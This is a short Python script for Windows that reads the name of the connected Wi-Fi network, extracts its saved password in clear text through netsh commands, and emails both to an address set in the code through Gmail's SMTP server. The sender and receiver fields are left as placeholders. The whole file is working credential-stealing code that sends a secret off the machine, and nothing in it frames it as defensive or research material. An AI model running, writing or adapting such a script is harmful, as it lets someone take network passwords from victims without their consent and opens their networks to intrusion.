import subprocess
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def retrieve_current_ssid():
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("latin-1")
        ssid_match = re.search(r"SSID\s*:\s(.*)", result)
        if ssid_match:
            return ssid_match.group(1).strip()
        else:
            return None
    except subprocess.CalledProcessError:
        print("Error: Unable to retrieve current WiFi SSID.")
        return None

def retrieve_wifi_password(ssid):
    try:
        profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"]).decode("latin-1")
        password_match = re.search(r"Key Content\s*:\s(.*)", profile_info)
        if password_match:
            return password_match.group(1).strip()
        else:
            return None
    except subprocess.CalledProcessError:
        print("Error: Unable to retrieve WiFi password.")
        return None

def send_email(subject, body):
    sender_email = "{replace}"
    receiver_email = "{replace}"
    password = "{replace}"

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully.")

def main():
    current_ssid = retrieve_current_ssid()
    if current_ssid:
        password = retrieve_wifi_password(current_ssid)
        if password:
            print(f"Connected WiFi SSID: {current_ssid}")
            print(f"Password: {password}")

            # Send email with WiFi SSID and password
            subject = "WiFi Password"
            body = f"Connected WiFi SSID: {current_ssid}\nPassword: {password}"
            send_email(subject, body)
        else:
            print(f"Password for WiFi SSID '{current_ssid}' not found or unable to retrieve.")
    else:
        print("No WiFi network currently connected.")

if __name__ == "__main__":
    main()
